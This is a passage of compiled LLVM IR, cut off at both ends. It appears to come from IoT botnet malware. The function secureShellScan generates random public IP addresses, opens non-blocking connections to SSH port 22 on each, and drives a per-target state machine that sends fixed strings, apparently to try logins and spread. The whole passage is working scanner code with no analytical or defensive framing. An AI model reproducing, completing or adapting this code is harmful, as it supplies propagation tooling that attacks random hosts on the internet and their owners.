  %1954 = load i32, i32* %2, align 4
  %1955 = sext i32 %1954 to i64
  %1956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1955
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1956, i32 0, i32 3
  store i8 1, i8* %1957, align 1
  br label %1958

1958:                                             ; preds = %1943, %1934
  br label %2053

1959:                                             ; preds = %69
  %1960 = load i32, i32* %2, align 4
  %1961 = sext i32 %1960 to i64
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1961
  %1963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1962, i32 0, i32 0
  %1964 = load i32, i32* %1963, align 16
  %1965 = call i64 @send(i32 noundef %1964, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 noundef 4, i32 noundef 16384)
  %1966 = icmp slt i64 %1965, 0
  br i1 %1966, label %1967, label %1982

1967:                                             ; preds = %1959
  %1968 = load i32, i32* %2, align 4
  %1969 = sext i32 %1968 to i64
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1969
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1970, i32 0, i32 0
  %1972 = load i32, i32* %1971, align 16
  %1973 = call i32 @sclose(i32 noundef %1972)
  %1974 = load i32, i32* %2, align 4
  %1975 = sext i32 %1974 to i64
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1975
  %1977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1976, i32 0, i32 2
  store i8 0, i8* %1977, align 8
  %1978 = load i32, i32* %2, align 4
  %1979 = sext i32 %1978 to i64
  %1980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1979
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1980, i32 0, i32 3
  store i8 1, i8* %1981, align 1
  br label %2054

1982:                                             ; preds = %1959
  %1983 = load i32, i32* %2, align 4
  %1984 = sext i32 %1983 to i64
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1984
  %1986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1985, i32 0, i32 2
  store i8 8, i8* %1986, align 8
  br label %2053

1987:                                             ; preds = %69
  %1988 = load i32, i32* %2, align 4
  %1989 = sext i32 %1988 to i64
  %1990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1989
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1990, i32 0, i32 6
  %1992 = load i32, i32* %1991, align 4
  %1993 = icmp eq i32 %1992, 0
  br i1 %1993, label %1994, label %2000

1994:                                             ; preds = %1987
  %1995 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1996 = load i32, i32* %2, align 4
  %1997 = sext i32 %1996 to i64
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1997
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1998, i32 0, i32 6
  store i32 %1995, i32* %1999, align 4
  br label %2000

2000:                                             ; preds = %1994, %1987
  %2001 = load i32, i32* %2, align 4
  %2002 = sext i32 %2001 to i64
  %2003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2002
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2003, i32 0, i32 0
  %2005 = load i32, i32* %2004, align 16
  %2006 = call i64 @send(i32 noundef %2005, i8* noundef getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i64 0, i64 0), i64 noundef 194, i32 noundef 16384)
  %2007 = icmp slt i64 %2006, 0
  br i1 %2007, label %2008, label %2028

2008:                                             ; preds = %2000
  %2009 = load i32, i32* %2, align 4
  %2010 = sext i32 %2009 to i64
  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2010
  %2012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2011, i32 0, i32 0
  %2013 = load i32, i32* %2012, align 16
  %2014 = call i32 @sclose(i32 noundef %2013)
  %2015 = load i32, i32* %2, align 4
  %2016 = sext i32 %2015 to i64
  %2017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2016
  %2018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2017, i32 0, i32 2
  store i8 0, i8* %2018, align 8
  %2019 = load i32, i32* %2, align 4
  %2020 = sext i32 %2019 to i64
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2020
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2021, i32 0, i32 3
  store i8 1, i8* %2022, align 1
  %2023 = load i32, i32* %2, align 4
  %2024 = sext i32 %2023 to i64
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2024
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2025, i32 0, i32 8
  %2027 = load i8*, i8** %2026, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %2027, i8 0, i64 1024, i1 false)
  br label %2054

2028:                                             ; preds = %2000
  %2029 = load i32, i32* %2, align 4
  %2030 = sext i32 %2029 to i64
  %2031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2030
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2031, i32 0, i32 6
  %2033 = load i32, i32* %2032, align 4
  %2034 = add i32 %2033, 10
  %2035 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %2036 = icmp ult i32 %2034, %2035
  br i1 %2036, label %2037, label %2052

2037:                                             ; preds = %2028
  %2038 = load i32, i32* %2, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2039
  %2041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2040, i32 0, i32 0
  %2042 = load i32, i32* %2041, align 16
  %2043 = call i32 @sclose(i32 noundef %2042)
  %2044 = load i32, i32* %2, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 2
  store i8 0, i8* %2047, align 8
  %2048 = load i32, i32* %2, align 4
  %2049 = sext i32 %2048 to i64
  %2050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2049
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2050, i32 0, i32 3
  store i8 1, i8* %2051, align 1
  br label %2052

2052:                                             ; preds = %2037, %2028
  br label %2053

2053:                                             ; preds = %2052, %1982, %1958, %1145, %1081, %733, %669, %380, %218, %69
  br label %2054

2054:                                             ; preds = %2053, %2008, %1967, %1909, %1884, %1856, %1815, %1790, %1762, %1721, %1696, %1668, %1627, %1602, %1574, %1533, %1508, %1480, %1439, %1414, %1386, %1345, %1320, %1292, %1251, %1226, %1198, %1130, %1107, %1022, %999, %976, %953, %930, %907, %884, %861, %847, %796, %718, %695, %611, %582, %519, %490, %439, %305, %171, %141
  %2055 = load i32, i32* %2, align 4
  %2056 = add nsw i32 %2055, 1
  store i32 %2056, i32* %2, align 4
  br label %65, !llvm.loop !43

2057:                                             ; preds = %65
  br label %63
}

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @secureShellScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.__sigset_t*, align 8
  %15 = call i32 @getdtablesize() #12
  %16 = sdiv i32 %15, 4
  %17 = mul nsw i32 %16, 3
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp sgt i32 %18, 512
  br i1 %19, label %20, label %21

20:                                               ; preds = %0
  br label %23

21:                                               ; preds = %0
  %22 = load i32, i32* %1, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = phi i32 [ 512, %20 ], [ %22, %21 ]
  store i32 %24, i32* %1, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 noundef zeroext 22) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 8, i1 false)
  %30 = load i32, i32* %1, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %9, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  store i64 %31, i64* %10, align 8
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %1, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 %37, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %57, %23
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %1, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %60

42:                                               ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 noundef 1024) #12
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 1024, i1 false)
  br label %57

57:                                               ; preds = %42
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  br label %38, !llvm.loop !44

60:                                               ; preds = %38
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 8, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

63:                                               ; preds = %1953, %60
  br label %64

64:                                               ; preds = %63
  store i32 0, i32* %2, align 4
  br label %65

65:                                               ; preds = %1950, %64
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %1953

69:                                               ; preds = %65
  %70 = load i32, i32* %2, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 2
  %74 = load i8, i8* %73, align 8
  %75 = zext i8 %74 to i32
  switch i32 %75, label %1949 [
    i32 0, label %76
    i32 1, label %219
    i32 2, label %381
    i32 3, label %538
    i32 4, label %606
    i32 5, label %950
    i32 6, label %1018
    i32 7, label %1827
    i32 8, label %1855
    i32 9, label %1883
  ]

76:                                               ; preds = %69
  %77 = load i32, i32* %2, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %81, i8 0, i64 1024, i1 false)
  %82 = load i32, i32* %2, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 3
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %108

88:                                               ; preds = %76
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  store i8* %93, i8** %12, align 8
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %95
  %97 = bitcast %struct.telstate_t* %96 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %97, i8 0, i64 32, i1 false)
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* %2, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 8
  store i8* %98, i8** %102, align 8
  %103 = call i32 @getRandomPublicIP()
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  br label %147

108:                                              ; preds = %76
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 5
  %113 = load i8, i8* %112, align 1
  %114 = add i8 %113, 1
  store i8 %114, i8* %112, align 1
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 5
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i64
  %121 = icmp eq i64 %120, 18
  br i1 %121, label %122, label %133

122:                                              ; preds = %108
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 5
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 4
  %131 = load i8, i8* %130, align 2
  %132 = add i8 %131, 1
  store i8 %132, i8* %130, align 2
  br label %133

133:                                              ; preds = %122, %108
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = zext i8 %138 to i64
  %140 = icmp eq i64 %139, 10
  br i1 %140, label %141, label %146

141:                                              ; preds = %133
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  store i8 1, i8* %145, align 1
  br label %1950

146:                                              ; preds = %133
  br label %147

147:                                              ; preds = %146, %88
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = call zeroext i16 @htons(i16 noundef zeroext 22) #15
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %152 = getelementptr inbounds [8 x i8], [8 x i8]* %151, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %152, i8 0, i64 8, i1 false)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 0
  store i32 %160, i32* %164, align 16
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

171:                                              ; preds = %147
  br label %1950

172:                                              ; preds = %147
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = load i32, i32* %2, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 16
  %183 = call i32 (i32, i32, ...) @fcntl(i32 noundef %182, i32 noundef 3, i8* noundef null)
  %184 = or i32 %183, 2048
  %185 = call i32 (i32, i32, ...) @fcntl(i32 noundef %177, i32 noundef 4, i32 noundef %184)
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 16
  %191 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %192 = call i32 @connect(i32 noundef %190, %struct.sockaddr* noundef %191, i32 noundef 16)
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %209

194:                                              ; preds = %172
  %195 = call i32* @__errno_location() #15
  %196 = load i32, i32* %195, align 4
  %197 = icmp ne i32 %196, 115
  br i1 %197, label %198, label %209

198:                                              ; preds = %194
  %199 = load i32, i32* %2, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %200
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 16
  %204 = call i32 @sclose(i32 noundef %203)
  %205 = load i32, i32* %2, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 3
  store i8 1, i8* %208, align 1
  br label %218

209:                                              ; preds = %194, %172
  %210 = load i32, i32* %2, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 2
  store i8 1, i8* %213, align 8
  %214 = load i32, i32* %2, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 6
  store i32 0, i32* %217, align 4
  br label %218

218:                                              ; preds = %209, %198
  br label %1949

219:                                              ; preds = %69
  %220 = load i32, i32* %2, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 6
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 0
  br i1 %225, label %226, label %232

226:                                              ; preds = %219
  %227 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 6
  store i32 %227, i32* %231, align 4
  br label %232

232:                                              ; preds = %226, %219
  br label %233

233:                                              ; preds = %232
  store %struct.__sigset_t* %4, %struct.__sigset_t** %14, align 8
  store i32 0, i32* %13, align 4
  br label %234

234:                                              ; preds = %244, %233
  %235 = load i32, i32* %13, align 4
  %236 = zext i32 %235 to i64
  %237 = icmp ult i64 %236, 16
  br i1 %237, label %238, label %247

238:                                              ; preds = %234
  %239 = load %struct.__sigset_t*, %struct.__sigset_t** %14, align 8
  %240 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %239, i32 0, i32 0
  %241 = load i32, i32* %13, align 4
  %242 = zext i32 %241 to i64
  %243 = getelementptr inbounds [16 x i64], [16 x i64]* %240, i64 0, i64 %242
  store i64 0, i64* %243, align 8
  br label %244

244:                                              ; preds = %238
  %245 = load i32, i32* %13, align 4
  %246 = add i32 %245, 1
  store i32 %246, i32* %13, align 4
  br label %234, !llvm.loop !45

247:                                              ; preds = %234
  br label %248

248:                                              ; preds = %247
  br label %249

249:                                              ; preds = %248
  %250 = load i32, i32* %2, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 16
  %255 = srem i32 %254, 64
  %256 = zext i32 %255 to i64
  %257 = shl i64 1, %256
  %258 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %259 = load i32, i32* %2, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 16
  %264 = sdiv i32 %263, 64
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds [16 x i64], [16 x i64]* %258, i64 0, i64 %265
  %267 = load i64, i64* %266, align 8
  %268 = or i64 %267, %257
  store i64 %268, i64* %266, align 8
  %269 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %269, align 8
  %270 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %270, align 8
  %271 = load i32, i32* %2, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = add nsw i32 %275, 1
  %277 = call i32 @select(i32 noundef %276, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %4, %struct.__sigset_t* noundef null, %struct.timeval* noundef %5)
  store i32 %277, i32* %3, align 4
  %278 = load i32, i32* %3, align 4
  %279 = icmp eq i32 %278, 1
  br i1 %279, label %280, label %337

280:                                              ; preds = %249
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %281 = load i32, i32* %2, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %282
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 16
  %286 = bitcast i32* %7 to i8*
  %287 = call i32 @getsockopt(i32 noundef %285, i32 noundef 1, i32 noundef 4, i8* noundef %286, i32* noundef %6) #12
  %288 = load i32, i32* %7, align 4
  %289 = icmp ne i32 %288, 0
  br i1 %289, label %290, label %305

290:                                              ; preds = %280
  %291 = load i32, i32* %2, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = call i32 @sclose(i32 noundef %295)
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 2
  store i8 0, i8* %300, align 8
  %301 = load i32, i32* %2, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 3
  store i8 1, i8* %304, align 1
  br label %336

305:                                              ; preds = %280
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = call i32 (i32, i32, ...) @fcntl(i32 noundef %315, i32 noundef 3, i8* noundef null)
  %317 = and i32 %316, -2049
  %318 = call i32 (i32, i32, ...) @fcntl(i32 noundef %310, i32 noundef 4, i32 noundef %317)
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 6
  store i32 0, i32* %322, align 4
  %323 = load i32, i32* %2, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 7
  store i16 0, i16* %326, align 16
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 8
  %331 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %331, i8 0, i64 1024, i1 false)
  %332 = load i32, i32* %2, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 2
  store i8 2, i8* %335, align 8
  br label %1950

336:                                              ; preds = %290
  br label %356

337:                                              ; preds = %249
  %338 = load i32, i32* %3, align 4
  %339 = icmp eq i32 %338, -1
  br i1 %339, label %340, label %355

340:                                              ; preds = %337
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 0
  %345 = load i32, i32* %344, align 16
  %346 = call i32 @sclose(i32 noundef %345)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 2
  store i8 0, i8* %350, align 8
